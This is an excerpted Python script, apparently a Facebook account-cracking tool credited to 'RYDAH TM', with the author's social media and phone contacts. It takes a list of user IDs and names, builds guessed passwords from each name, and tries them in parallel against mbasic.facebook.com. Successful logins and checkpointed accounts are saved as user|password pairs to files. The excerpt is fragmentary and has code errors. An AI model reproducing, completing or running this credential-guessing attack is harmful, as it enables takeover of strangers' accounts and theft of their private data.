...
def main_apv():
    ...
    r1=requests.get("https://github.com/Rydah300/RydahTm/blob/main/token.txt").text
...
|          \            |                  /
   ...
   \033[1;37m  
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           RYDAH TM
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          RYDAHMAN
\033[1;31m\033[1;37m Whatsapp\x1b[1;97m  : \033[1;37m           +2349017624430
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mY_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mY_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Y Menu ")
	    yasin()
...
def yasin():
    ...
    print(' [E] exit ')
    print('')
    _yasin___ = input(' [?] Choose option : ')
    if _yasin___ in ('1', '01'):
        __xxx__(). yasinx(id)
    if _yasin___ in ('2', '02'):
        create_file()
    if _yasin___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[Y {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [RYDAH TM-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('RYDAH TM_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('RYDAH TM_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        Yworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            ...
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with yasinY(max_workers=30) as Yworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
